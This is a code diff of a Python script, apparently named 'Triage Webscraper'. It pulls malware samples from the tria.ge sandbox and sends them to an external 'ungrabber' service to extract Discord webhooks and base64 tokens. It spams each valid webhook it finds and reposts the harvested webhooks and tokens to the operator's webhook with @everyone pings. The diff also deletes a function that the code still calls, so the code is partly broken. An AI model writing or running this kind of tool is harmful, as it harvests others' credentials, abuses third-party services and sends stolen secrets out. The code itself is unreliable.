@@ -2,13 +2,12 @@ from colorama import init, Fore, Style
 import random
 import os
 import requests
-from datetime import datetime
+from datetime import datetime, UTC
 import time
 from bs4 import BeautifulSoup
 from concurrent.futures import ThreadPoolExecutor
 import asyncio
 import re
-from instances import info, success, error, newlog, newlog1
 from spammer import spam_messages
 
 init(autoreset=True)
@@ -23,15 +22,14 @@ main_webhook = open("webhook_log.txt").read().strip()
 def check_webhook():
     current_time = datetime.now().strftime("%H:%M:%S")
     if main_webhook == "YOUR_WEBHOOK_HERE":
-        error(f"No webhook provided in webhook_log.txt!")
-        error(f"Submissions cannot be logged without a webhook")
+        print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}No webhook specified! {Fore.WHITE}[{Fore.RED}404{Fore.WHITE}]{Style.RESET_ALL} 🎄")
         exit(1)
     else:
         webhook_req = requests.get(main_webhook)
         if webhook_req.status_code == 200:
-            success(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Valid webhook {Fore.WHITE}[{Fore.GREEN}200{Fore.WHITE}]{Style.RESET_ALL} 🎄")
+            print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Valid webhook {Fore.WHITE}[{Fore.GREEN}200{Fore.WHITE}]{Style.RESET_ALL} 🎄")
         else:
-            error(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}Invalid webhook {Fore.WHITE}[{Fore.RED}404{Fore.WHITE}]{Style.RESET_ALL} 🎄")
+            print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}Invalid webhook {Fore.WHITE}[{Fore.RED}404{Fore.WHITE}]{Style.RESET_ALL} 🎄")
             exit(1)
 check_webhook()
 
@@ -45,48 +43,64 @@ if triage_get_request.status_code != 200:
     print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}Decompiling feature unavailable{Style.RESET_ALL} ❄️")
     time.sleep(3)
 else:
-    success(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}API Connected!{Style.RESET_ALL} 🎅")
+    print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}API Connected!{Style.RESET_ALL} 🎅")
     time.sleep(0.5)
-    success(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Decompiler Ready{Style.RESET_ALL} ❄️")
+    print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Decompiler Ready{Style.RESET_ALL} ❄️")
     time.sleep(3)
 
 now = datetime.now()
 current_time = now.strftime("%H:%M:%S")
 
+def decompile_file(file_content):
+    current_time = datetime.now().strftime("%H:%M:%S")
+    try:
+        if triage_get_request.status_code != 200:
+            print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}Cannot decompile: Invalid or missing API key{Style.RESET_ALL} 🎄")
+            return None
+
+        ilikeblack = requests.post('https://lululepu.fr/ungrabber', files={'file': file_content})
+        response2 = ilikeblack.json()
+
+        if response2 and 'result' in response2:
+            return response2['result']
+        return None
+    except Exception as e:
+        print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}Decompiling error: {e}{Style.RESET_ALL} 🎄")
+        return None
+
 async def process_submission(report_id, file_name, fams, score, time_uploaded, tags):
     current_time = datetime.now().strftime("%H:%M:%S")
     if fams in ['asyncrat', 'atomsilo', 'blackmatter', 'cerber', 'urelas', 'xmrig', 'metasploit', 'xworm', 'cryptbot', 'cyrat', 'acobaltstrike', 'umbral', 'blacknet', 'berbew', 'blackmoon', 'emotet', 'mydoom', 'neshta', 'doomrat', 'shadowrat']:
-        error(f"Blacklisted: {fams}")
-        error(f"File: {file_name}")
+        print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}Blacklisted: {fams}{Style.RESET_ALL}")
+        print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}File: {file_name}{Style.RESET_ALL}")
         os.system("cls")
         return
 
     if file_name.endswith((".zip", ".rar", ".7z", ".tar", ".sh", ".bat")):
-        info("This extension is not supported. Skipping file")
+        print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.WHITE}This extension is not supported. Skipping file{Style.RESET_ALL}")
         time.sleep(3)
         os.system("cls")
         return
 
     try:
-        info("Decompiling...")
+        print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.WHITE}Decompiling...{Style.RESET_ALL}")
         file_content = requests.get(f'https://tria.ge/api/v0/samples/{report_id}/sample', headers={"Authorization": f"Bearer {triage_api_key}"}).content
 
-        ilikeblack = requests.post('https://lululepu.fr/ungrabber', files={'file': file_content})
-        response2 = ilikeblack.json()
-
-        def contains_base64(text):
-            base64_regex = r'(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
-            return re.search(base64_regex, text) is not None
-
-        if response2 and 'result' in response2:
-            result = response2['result']
+        result = decompile_file(file_content)
+        if result:
             if "webhook" in result:
-                success(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Webhook valid!{Style.RESET_ALL} 🎄")
-                os.system("cls")
-                spam_messages(result, 2)
-                requests.post(main_webhook, data={"content": f"🎅 **New Valid Webhook** 🎄\n`{result}` ❄️ @everyone"})
+                webhook_test = requests.get(result)
+                if webhook_test.status_code == 200:
+                    print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Webhook valid!{Style.RESET_ALL} 🎄")
+                    os.system("cls")
+                    spam_messages(result, 2)
+                    requests.post(main_webhook, data={"content": f"🎅 **New Valid Webhook** 🎄\n`{result}` ❄️ @everyone"})
+                    requests.post(main_webhook, data={"content": f"🎅 **New Valid Webhook** 🎄\n`{result}` ❄️ @everyone"})
+                else:
+                    print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.RED}Invalid webhook: {result}{Style.RESET_ALL} 🎄")
+                    requests.post(main_webhook, data={"content": f"🎅 **Invalid Webhook** 🎄\n`{result}` ❄️ @everyone"})
             elif contains_base64(result):
-                success("🎅 Successfully decompiled Base64 string: 🎄 " + result)
+                print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Successfully decompiled Base64 string: {result}{Style.RESET_ALL} 🎄")
                 requests.post(main_webhook, data={"content": f"🎅 **New Token** 🎄\n`{result}` ❄️ @everyone"})
 
     except Exception as e:
@@ -130,32 +144,62 @@ def check_for_new_submissions():
                 os.system("cls")
 
                 if score is not None and score > 6:
+                    print(f"\n{Fore.GREEN}{'='*20} NEW SUBMISSION {'='*20}{Style.RESET_ALL}\n")
+
                     log_entries = [
-                        ("🎄 ID:", report_id),
-                        ("🎅 Name:", file_name),
-                        ("⭐ Score:", score),
-                        ("🎁 Family:", fams),
-                        ("❄️  Tags:", ', '.join(tags) if tags else 'No tags'),
-                        ("🔔 Time Uploaded:", time_uploaded)
+                        ("🎄 ID:", f"{Fore.CYAN}{report_id}{Style.RESET_ALL}"),
+                        ("🎅 Name:", f"{Fore.WHITE}{file_name}{Style.RESET_ALL}"),
+                        ("⭐ Score:", f"{Fore.RED if score > 8 else Fore.WHITE}{score}{Style.RESET_ALL}"),
+                        ("🎁 Family:", f"{Fore.MAGENTA}{fams}{Style.RESET_ALL}"),
+                        ("❄️  Tags:", f"{Fore.BLUE}{', '.join(tags) if tags else 'No tags'}{Style.RESET_ALL}"),
+                        ("🔔 Time:", f"{Fore.GREEN}{time_uploaded}{Style.RESET_ALL}")
                     ]
 
-                    print("\n" + "─" * 50 + "\n")
-                    for title, value in log_entries:
-                        newlog1(f"{title} {value}")
-                    print("\n" + "─" * 50 + "\n")
+                    box_width = 54
+                    BORDER = Fore.BLUE + Style.BRIGHT
+                    TITLE = Fore.CYAN + Style.BRIGHT
+                    VALUE = Fore.WHITE
+                    SCORE_HIGH = Fore.RED + Style.BRIGHT
+                    SCORE_MED = Fore.YELLOW + Style.BRIGHT
 
-                    random_color = random.choice([0xFF0000, 0x00FF00, 0xFFD700, 0x0000FF, 0xFF00FF, 0x00FFFF, 0x800080, 0xFFA500, 0x008000, 0x800000])
+                    print(f"{BORDER}┌{'─' * (box_width-2)}┐{Style.RESET_ALL}")
+                    for title, value in log_entries:
+                        if title == "❄️ Tags:":
+                            max_tag_length = 25
+                            tags_str = value
+                            if len(tags_str) > max_tag_length:
+                                tags_str = value[:max_tag_length] + f"{Fore.CYAN}...{Style.RESET_ALL}"
+
+                            padding = box_width - len(title) - len(tags_str) - 4
+                            if padding < 0: padding = 0
+                            print(f"{BORDER} {TITLE}{title}{Style.RESET_ALL} {VALUE}{tags_str}{' ' * padding} {BORDER}{Style.RESET_ALL}")
+                        else:
+                            padding = box_width - len(title) - len(value) - 4
+                            print(f"{BORDER} {TITLE}{title}{Style.RESET_ALL} {VALUE}{value}{Style.RESET_ALL}{' ' * padding} {BORDER}{Style.RESET_ALL}")
+                    print(f"{BORDER}└{'─' * (box_width-2)}┘{Style.RESET_ALL}\n")
+
+                    random_color = random.choice([
+                        0x00FFFF,
+                        0x4169E1,
+                        0xFF1493,
+                        0x32CD32,
+                        0x9370DB,
+                        0x00CED1,
+                    ])
 
                     logEmbed = {
-                        "title": f"🎄 {report_id}",
+                        "title": f"🎄 New Malware Submission Detected 🎄",
+                        "description": f"**Report ID:** {report_id}",
                         "fields": [
-                            {"name": "🎅 Name", "value": file_name},
-                            {"name": "🎄 Tags", "value": ', '.join(tags) if tags else 'No tags'},
-                            {"name": "🎅 Time Uploaded", "value": time_uploaded},
-                            {"name": "🎄 Family", "value": fams}
+                            {"name": "🎅 File Name", "value": f"`{file_name}`", "inline": True},
+                            {"name": "⭐ Risk Score", "value": f"`{score}/10`", "inline": True},
+                            {"name": "🎁 Family", "value": f"`{fams}`", "inline": True},
+                            {"name": "❄️ Tags", "value": f"`{', '.join(tags) if tags else 'No tags'}`"},
+                            {"name": "🔔 Upload Time", "value": f"`{time_uploaded}`", "inline": True}
                         ],
                         "color": random_color,
-                        "footer": {"text": "🎅 Monokai was here 🎄"}
+                        "footer": {"text": "🎅 Triage Webscraper • Made with ️"},
+                        "timestamp": datetime.now(UTC).isoformat()
                     }
                     try:
                         requests.post(main_webhook, json={"embeds": [logEmbed]})
@@ -167,14 +211,23 @@ def check_for_new_submissions():
                 processed_ids.add(report_id)
 
                 if 'discordrat' in tags:
-                    success(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Found DiscordRAT in submission{Style.RESET_ALL} 🎅 https://tria.ge/{report_id}")
+                    print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.GREEN}Found DiscordRAT in submission{Style.RESET_ALL} 🎅 https://tria.ge/{report_id}")
                     requests.post(main_webhook, data={"content": f"🎄 **DiscordRAT** 🎅\nDiscordRAT Found in Submission {report_id}! ❄️ @everyone"})
 
 def main():
-    while True:
-        check_for_new_submissions()
-        info("Scanning for New Submissions... ❄️ ")
-        time.sleep(0.5)
+    try:
+        print(f"{Fore.GREEN}{'='*20} TRIAGE WEBSCRAPER {'='*20}{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}Starting webscraper...{Style.RESET_ALL}")
+        while True:
+            check_for_new_submissions()
+            print(f"[{Fore.CYAN}{current_time}{Style.RESET_ALL}] {Fore.WHITE}Scanning for new submissions...{Style.RESET_ALL}", end='\r')
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}Shutting down...{Style.RESET_ALL}")
+        exit(0)
+    except Exception as e:
+        print(f"\n{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")
+        exit(1)
 
 if __name__ == "__main__":
     main()
